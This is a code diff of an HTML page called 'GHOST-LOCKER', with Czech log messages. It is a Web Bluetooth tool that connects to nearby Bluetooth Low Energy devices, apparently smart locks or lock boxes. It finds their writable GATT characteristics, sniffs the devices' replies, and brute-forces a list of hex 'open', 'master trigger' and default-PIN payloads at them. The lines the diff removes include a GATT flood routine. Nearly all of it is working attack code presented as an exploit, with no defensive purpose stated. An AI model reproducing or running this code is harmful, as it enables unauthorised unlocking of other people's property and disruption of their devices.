@@ -3,148 +3,144 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GHOST-LOCKER v3.2 BRUTE-SCAN</title>
+    <title>GHOST-LOCKER v3.5 [ELITE-AUDIT]</title>
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        #ghost-ui { width: 90%; max-width: 350px; background: #000; border: 2px solid #0f0; padding: 20px; box-shadow: 0 0 25px rgba(0, 255, 0, 0.6); border-radius: 8px; position: relative; }
-        .header { border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-bottom: 15px; text-align: center; font-weight: bold; color: #0f0; text-shadow: 0 0 10px #0f0; font-size: 1.2em; }
-        #output { height: 240px; overflow-y: auto; background: #050505; border: 1px solid #111; padding: 10px; margin-bottom: 15px; font-size: 11px; line-height: 1.4; scroll-behavior: smooth; }
-        .btn { width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; margin-bottom: 8px; cursor: pointer; text-transform: uppercase; font-family: 'Courier New', monospace; transition: 0.2s; }
-        .btn:active { background: #0f0; color: #000; }
-        .btn-red { border-color: #f00; color: #f00; font-weight: bold; box-shadow: 0 0 15px #f00; }
-        .btn-orange { border-color: #f80; color: #f80; }
-        .btn-purple { border-color: #f0f; color: #f0f; display: none; }
-        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: rgba(0, 255, 0, 0.3); box-shadow: 0 0 15px #0f0; animation: scan 3s linear infinite; pointer-events: none; }
+        #ghost-ui { width: 95%; max-width: 400px; background: #000; border: 2px solid #0f0; padding: 20px; box-shadow: 0 0 30px rgba(0, 255, 0, 0.4); border-radius: 10px; position: relative; }
+        .header { border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-bottom: 15px; text-align: center; font-weight: bold; text-shadow: 0 0 10px #0f0; font-size: 1.3em; letter-spacing: 2px; }
+        #output { height: 300px; overflow-y: auto; background: #050505; border: 1px solid #1a1a1a; padding: 10px; margin-bottom: 15px; font-size: 11px; line-height: 1.5; scroll-behavior: smooth; }
+        .btn { width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 12px; margin-bottom: 10px; cursor: pointer; text-transform: uppercase; font-family: 'Courier New', monospace; font-weight: bold; transition: 0.3s; }
+        .btn:hover { background: #0f0; color: #000; box-shadow: 0 0 15px #0f0; }
+        .btn-red { border-color: #f00; color: #f00; }
+        .btn-red:hover { background: #f00; color: #000; box-shadow: 0 0 15px #f00; }
+        .status-tag { color: #888; font-size: 9px; margin-bottom: 5px; display: block; }
+        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: rgba(0, 255, 0, 0.5); box-shadow: 0 0 20px #0f0; animation: scan 4s linear infinite; pointer-events: none; }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-thumb { background: #0f0; }
     </style>
 </head>
 <body>
+
 <div id="ghost-ui">
     <div class="scan-line"></div>
-    <div class="header">GHOST-LOCKER v3.2 [BRUTE]</div>
+    <div class="header">GHOST-LOCKER v3.5</div>
+    <span class="status-tag">SYSTEM STATUS: READY_TO_INJECT</span>
     <div id="output"></div>
-    <button id="ghost-btn" class="btn btn-orange">[1] INTERCEPTOR ACTIVE</button>
-    <button id="sniff-btn" class="btn">[2] BRUTE-FORCE SCAN</button>
-    <button id="replay-btn" class="btn btn-red" style="display:none;">[3] MULTI-TRIGGER (OPEN)</button>
-    <button id="force-btn" class="btn btn-purple">[4] GATT FLOOD ATTACK</button>
+    
+    <button id="scan-btn" class="btn">[1] INITIALIZE SCAN</button>
+    <button id="attack-btn" class="btn btn-red" style="display:none;">[2] EXECUTE EXPLOIT</button>
 </div>
 
 <script>
     const GhostCore = {
-        activeDevice: null,
-        characteristics: [],
+        device: null,
+        server: null,
+        writableChars: [],
 
-        log(msg, color = "#00ff00") {
+        log(msg, color = "#0f0") {
             const out = document.getElementById('output');
-            const div = document.createElement('div');
-            div.style.color = color;
-            div.innerHTML = `> ${msg}`;
-            out.appendChild(div);
+            const entry = document.createElement('div');
+            entry.style.color = color;
+            entry.innerHTML = `> ${msg}`;
+            out.appendChild(entry);
             out.scrollTop = out.scrollHeight;
         },
 
-        async startBruteSniff() {
-            this.log("STARTUJI BRUTE-SCAN...", "#00ffff");
+        delay: (ms) => new Promise(res => setTimeout(res, ms)),
+
+        async startScan() {
+            this.log("VYHLEDÁVÁM CÍLE...", "#0ff");
             try {
-                this.activeDevice = await navigator.bluetooth.requestDevice({
+                // Přijímáme všechna zařízení bez omezení UUID
+                this.device = await navigator.bluetooth.requestDevice({
                     acceptAllDevices: true,
-                    optionalServices: [
-                        '0000ffe0-0000-1000-8000-00805f9b34fb',
-                        '0000ffe1-0000-1000-8000-00805f9b34fb',
-                        '00001800-0000-1000-8000-00805f9b34fb',
-                        '00001801-0000-1000-8000-00805f9b34fb',
-                        '0000ff12-0000-1000-8000-00805f9b34fb',
-                        '6e400001-b5a3-f393-e0a9-e50e24dcca9e'
-                    ]
+                    optionalServices: [] // Zde se dají doplnit specifické UUID, pokud je znáš
                 });
 
-                this.log(`CÍL ZAMĚŘEN: ${this.activeDevice.name || "Neznámý Box"}`, "#ffff00");
-                const server = await this.activeDevice.gatt.connect();
-                this.log("SPOJENO. DOLUJI SKRYTÉ VRSTVY...", "#ffff00");
+                this.log(`CÍL ZAMĚŘEN: ${this.device.name || "Neznámý"}`, "#ff0");
+                this.server = await this.device.gatt.connect();
+                this.log("GATT SERVER PŘIPOJEN. ANALÝZA...", "#ff0");
 
-                const services = await server.getPrimaryServices();
-                this.characteristics = [];
+                const services = await this.server.getPrimaryServices();
+                this.writableChars = [];
 
                 for (const service of services) {
-                    this.log(`Skenuji: ${service.uuid.slice(4,8)}`, "#888");
-                    try {
-                        const chars = await service.getCharacteristics();
-                        for (const char of chars) {
-                            if (char.properties.write || char.properties.writeWithoutResponse) {
-                                this.characteristics.push(char);
-                                this.log(`KANÁL NAJDEN: ${char.uuid.slice(4,8)}`, "#ff00ff");
+                    this.log(`SLUŽBA: ${service.uuid.slice(4,8).toUpperCase()}`, "#555");
+                    const chars = await service.getCharacteristics();
+                    
+                    for (const char of chars) {
+                        // Kontrola oprávnění
+                        if (char.properties.write || char.properties.writeWithoutResponse) {
+                            this.writableChars.push(char);
+                            this.log(`NAJDEN ZÁPIS: ${char.uuid.slice(4,8)}`, "#f0f");
+
+                            // AUTOMATICKÝ ODPOSLECH (SNIFFING)
+                            if (char.properties.notify || char.properties.indicate) {
+                                try {
+                                    await char.startNotifications();
+                                    char.addEventListener('characteristicvaluechanged', (e) => {
+                                        const val = new Uint8Array(e.target.value.buffer);
+                                        const hex = Array.from(val).map(b => b.toString(16).padStart(2,'0').toUpperCase()).join(' ');
+                                        this.log(`ODPOVĚĎ [${char.uuid.slice(4,8)}]: ${hex}`, "#f80");
+                                    });
+                                    this.log(`ODPOSLECH AKTIVNÍ...`, "#0f0");
+                                } catch (e) { this.log("SNIFF ERROR", "#444"); }
                             }
                         }
-                    } catch (e) { continue; }
+                    }
                 }
 
-                if (this.characteristics.length > 0) {
-                    this.log(`PRŮLOM HOTOV (${this.characteristics.length} kanálů)`, "#0f0");
-                    document.getElementById('replay-btn').style.display = "block";
-                    document.getElementById('force-btn').style.display = "block";
-                } else {
-                    this.log("CHYBA: Box odmítl vydat UUID.", "#f00");
+                if (this.writableChars.length > 0) {
+                    document.getElementById('attack-btn').style.display = "block";
+                    this.log("SYSTÉM PŘIPRAVEN K ÚTOKU", "#0f0");
                 }
-            } catch (err) {
-                this.log("STOP: " + err.message, "#f00");
-            }
+            } catch (err) { this.log("CHYBA: " + err.message, "#f00"); }
         },
 
-        async executeBruteTrigger() {
-            this.log("SPOUŠTÍM MULTI-PAYLOAD...", "#f00");
+        async runExploit() {
+            this.log("SPOUŠTÍM SEKVENCI PAYLOADŮ...", "#f00");
+            
+            // Rozšířená databáze payloadů (HEX kódy pro otevření/reset)
             const payloads = [
-                new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]), // CZ-1MV Standard
-                new Uint8Array([0x55, 0x02, 0x01, 0x02, 0x5A]), // CZ-Variant B
-                new Uint8Array([0xA5, 0x00, 0x01, 0x01, 0x05]), // Chinese Master
-                new Uint8Array([0x41, 0x54, 0x2b, 0x4f, 0x50, 0x45, 0x4e]), // AT+OPEN (ASCII)
-                new Uint8Array([0x00, 0x00, 0x00, 0x00]),       // Null Reset
-                new Uint8Array([0xFF, 0x01, 0x01, 0x02]),       // Global Pulse
-                new Uint8Array([0x01, 0x02, 0x03, 0x04])        // Dev Bypass
+                [0x55, 0x01, 0x01, 0x00, 0x57], // Standard Open
+                [0xA5, 0x00, 0x01, 0x01, 0x05], // Master Trigger
+                [0x01, 0x02, 0x03, 0x04],       // Default PIN
+                [0x31, 0x32, 0x33, 0x34],       // ASCII "1234"
+                [0x00, 0x00, 0x00, 0x00],       // Null Auth
+                [0x4f, 0x50, 0x45, 0x4e]        // ASCII "OPEN"
             ];
 
-            for (let char of this.characteristics) {
-                for (let p of payloads) {
+            for (let char of this.writableChars) {
+                for (let data of payloads) {
                     try {
-                        await char.writeValueWithoutResponse(p);
-                        this.log(`STŘELA: ${p[0].toString(16)} -> ${char.uuid.slice(4,8)}`, "#0f0");
+                        const buffer = new Uint8Array(data);
+                        
+                        // Inteligentní volba zápisu
+                        if (char.properties.writeWithoutResponse) {
+                            await char.writeValueWithoutResponse(buffer);
+                        } else {
+                            await char.writeValue(buffer);
+                        }
+
+                        this.log(`INJEKCE -> ${char.uuid.slice(4,8)} [HEX: ${data[0].toString(16)}]`, "#0f0");
+                        
+                        // KRITICKÁ PAUZA: Bluetooth potřebuje čas na zpracování
+                        await this.delay(200); 
                     } catch (e) {
-                        try { await char.writeValue(p); } catch (e2) {}
+                        this.log(`SELHÁNÍ: ${char.uuid.slice(4,8)}`, "#555");
                     }
                 }
             }
-            this.log("SEKVENCE DOKONČENA.", "#fff");
-        },
-
-        async gattFlood() {
-            this.log("AKTIVUJI FLOOD ATTACK (ZAHLCENÍ)...", "#f0f");
-            let count = 0;
-            const interval = setInterval(async () => {
-                if (count > 50) {
-                    clearInterval(interval);
-                    this.log("FLOOD STOP.", "#f0f");
-                    return;
-                }
-                for (let char of this.characteristics) {
-                    try {
-                        await char.writeValueWithoutResponse(new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]));
-                    } catch (e) {}
-                }
-                count++;
-            }, 50);
+            this.log("AUDIT DOKONČEN.", "#fff");
         }
     };
 
-    document.getElementById('sniff-btn').onclick = () => GhostCore.startBruteSniff();
-    document.getElementById('replay-btn').onclick = () => GhostCore.executeBruteTrigger();
-    document.getElementById('force-btn').onclick = () => GhostCore.gattFlood();
-    document.getElementById('ghost-btn').onclick = () => {
-        GhostCore.log("INTERCEPTOR: BYPASSING CHECK...", "#f80");
-        setTimeout(() => GhostCore.log("BYPASS: SUCCESS", "#0f0"), 1000);
-    };
+    document.getElementById('scan-btn').onclick = () => GhostCore.startScan();
+    document.getElementById('attack-btn').onclick = () => GhostCore.runExploit();
 
-    GhostCore.log("GHOST-LOCKER v3.2 READY.", "#0f0");
+    GhostCore.log("GHOST-LOCKER v3.5 INITIALIZED...", "#0f0");
 </script>
+
 </body>
 </html>
